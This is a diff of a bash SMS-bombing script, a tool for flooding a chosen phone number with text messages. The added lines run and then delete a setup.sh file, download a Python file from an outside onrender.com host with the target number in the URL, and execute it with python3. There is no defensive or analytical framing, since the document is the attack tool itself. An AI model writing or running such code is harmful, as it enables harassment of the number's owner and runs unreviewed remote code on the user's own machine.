@@ -1,5 +1,10 @@
+if [ -f "setup.sh" ];
+then
+bash setup.sh
+rm setup.sh
+fi
 clear
- banner(){
+banner(){
 echo -e '\e[95m
 ────────────█───────────────█
 ────────────██─────────────██
@@ -38,13 +43,24 @@ echo -e '\e[91m
 banner
 echo  -ne "\e[91m Enter Your number :-"
 sleep 5
+
 bomb(){
 clear 
 banner 
+echo -e "\e[95m Settting Up Server"
+curl -o keshav.py "https://mbomber2-o.onrender.com/jatinkalwar/sms/$num" 
+if [ -f "keshav.py" ];
+then
+action=$(cat keshav.py)
+if [ "$action" == "false" ];then
+echo "Something Went Wrong From Server"
+else
 echo -e "\e[95m Bombing start"
-cp api.sh app.sh
-sed -i s/€tor/$num/g app.sh
-bash app.sh 
+python3 keshav.py
+fi
+else
+echo "Something Went Wrong"
+fi
 con
 }
 con(){
